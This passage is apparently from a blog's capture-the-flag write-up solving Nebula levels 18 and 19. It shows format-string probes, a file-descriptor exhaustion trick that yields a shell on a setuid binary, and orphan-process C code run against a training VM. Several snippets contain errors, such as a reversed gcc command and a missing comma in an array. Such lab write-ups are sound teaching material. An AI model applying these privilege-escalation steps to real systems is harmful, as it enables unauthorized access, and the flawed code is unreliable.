<figure class="highlight"><pre><code class="language-text" data-lang="text">site exec %s%s%s%s%s  # notsupported() -&gt; prints some of the stack
site exec %n  # notsupported() -&gt; fails with *** %n in writable segment detected ***
setuser AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  # setuser() -&gt; exits immediately, detecting buffer overflow</code></pre></figure>

<h3 id="solution">Solution</h3>

<p><code class="language-plaintext highlighter-rouge">if(fp)</code> will fail if the file can’t be opened for any reason. Since the files opened by <code class="language-plaintext highlighter-rouge">login</code> are never closed, we can open files until we reach the maximum number of file descriptors. <code class="language-plaintext highlighter-rouge">fp</code> will then be <code class="language-plaintext highlighter-rouge">NULL</code> once the maximum number is reached. Finally, we use <code class="language-plaintext highlighter-rouge">closelog</code> to free a file descriptor.</p>

<p>If <code class="language-plaintext highlighter-rouge">closelog</code> isn’t called, <code class="language-plaintext highlighter-rouge">execve("/bin/sh", ...)</code> will fail with an error loading a shared library <code class="language-plaintext highlighter-rouge">libncurses.so.5</code>.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 2000<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"login foo"</span> <span class="o">&gt;&gt;</span> ~/flood<span class="p">;</span> <span class="k">done</span>
<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"closelog"</span> <span class="o">&gt;&gt;</span> ~/flood
<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"shell"</span> <span class="o">&gt;&gt;</span> ~/flood
<span class="gp">$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"getflag &gt; /tmp/getflag.log"</span> <span class="o">&gt;</span> /tmp/getflag <span class="o">&amp;&amp;</span> <span class="nb">chmod </span>a+x /tmp/getflag</code></pre></figure>

<p>The initial attempt looks like this:</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cd</span> /home/flag18/
<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> ~/flood | ./flag18 <span class="nt">-d</span> /dev/tty
<span class="c">...
</span><span class="go">/home/flag18/flag18: -d: invalid option</span></code></pre></figure>

<p><code class="language-plaintext highlighter-rouge">sh</code> doesn’t have a <code class="language-plaintext highlighter-rouge">-d</code> flag. The author left a hint to look at the options in the man page; <code class="language-plaintext highlighter-rouge">sh</code> needs an option that ignores the input afterwards.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> ~/flood | ./flag18 <span class="nt">--init-file</span> /tmp/getflag <span class="nt">-d</span> /dev/tty</code></pre></figure>

<p>This actually opens a promptless shell reading from stdin.</p>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="c">...
</span><span class="go">logged in successfully (without password file)
logged in successfully (without password file)
logged in successfully (without password file)
whoami
flag18
cat /home/flag18/password
44226113-d394-4f46-9406-91888128e27a
getflag
You have successfully executed getflag on a target account</span></code></pre></figure>

<p>The password doesn’t seem to work for logging into the <code class="language-plaintext highlighter-rouge">flag18</code> account, but the shell can execute <code class="language-plaintext highlighter-rouge">getflag</code>.</p>

<h2 id="level-19">Level 19</h2>
<p><strong>Description</strong> <a href="http://exploit-exercises.com/nebula/level19">(full)</a>: The <code class="language-plaintext highlighter-rouge">flag19</code> executable checks if the root user started the process. If so, then it runs <code class="language-plaintext highlighter-rouge">execve</code> on <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>

<p><a href="http://cs61.seas.harvard.edu/cs61wiki/images/7/7b/Lec21-Processes.pdf">CS61 Lecture Notes (Processes)</a> was particularly valuable here. I won’t end up taking the class, but I should show my appreciation for the lecture notes – they’re all very well made.</p>

<p>We want to start <code class="language-plaintext highlighter-rouge">flag19</code> in an <a href="http://en.wikipedia.org/wiki/Orphan_process">orphan process</a>. An orphan process is claimed by the program <code class="language-plaintext highlighter-rouge">init</code> (PID 1), which is owned by root (UID 0). The plan looks like:</p>

<ol>
  <li>Use <code class="language-plaintext highlighter-rouge">fork()</code> to create a child process, exit the parent process, and <code class="language-plaintext highlighter-rouge">sleep()</code> to create an orphan.</li>
  <li>Execute <code class="language-plaintext highlighter-rouge">/home/flag19/flag19</code> with our arguments The <code class="language-plaintext highlighter-rouge">stat</code> should complete successfully, as we control the time of check.</li>
</ol>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="c1">// attempt.c</span>

<span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">sleep</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"executing code in orphan…</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
		<span class="kt">char</span> <span class="o">*</span><span class="n">flag19_args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"-c"</span> <span class="s">"/home/level19/run19.sh"</span> <span class="p">};</span>
		<span class="n">execv</span><span class="p">(</span><span class="s">"/home/flag19/flag19"</span><span class="p">,</span> <span class="n">flag19_args</span><span class="p">);</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">else</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"returning from parent</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"sanity check, outside both - should never happen</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c">#!/bin/bash.sh</span>
<span class="c"># /home/level19/run19.sh</span>
<span class="c"># Standard getflag wrapper</span>
<span class="nv">file</span><span class="o">=</span>/home/flag19/getflag19.log
getflag <span class="o">&gt;</span> <span class="k">${</span><span class="nv">file</span><span class="k">}</span>
<span class="nb">id</span> <span class="o">&gt;&gt;</span> <span class="k">${</span><span class="nv">file</span><span class="k">}</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span>gcc <span class="nt">-o</span> attempt.c attempt
<span class="gp">$</span><span class="w"> </span>./attempt
<span class="go">returning from parent
</span><span class="gp">$</span><span class="w"> </span>executing code <span class="k">in </span>orphan...
<span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /home/flag19/getflag19.log
<span class="go">You have successfully executed getflag on a target account
uid=1020(level19) ...</span></code></pre></figure>

<h3 id="tangent">Tangent</h3>
<p>I ran into an interesting issue caused by laziness (well, in reality, a desire for flexibility).</p>

<p>The code below does <strong>not</strong> run <code class="language-plaintext highlighter-rouge">execve</code> as suid. It runs it as the user <code class="language-plaintext highlighter-rouge">level19</code> instead of <code class="language-plaintext highlighter-rouge">flag19</code>, which may have been caused by passing down <code class="language-plaintext highlighter-rouge">envp</code>.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fork</span> <span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="c1">// our other code…</span>
		<span class="n">execve</span><span class="p">(</span><span class="s">"/home/flag19/flag19"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>This meant that I could conveniently pass arguments through the executable:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gcc attempt.c -o attempt
./attempt "/home/level19/run19.sh"</code></pre></figure>

<p>Unfortunately, it also meant that <code class="language-plaintext highlighter-rouge">getflag</code> wouldn’t execute on the correct user.</p>
]]></content>
  </entry>
  
</feed>
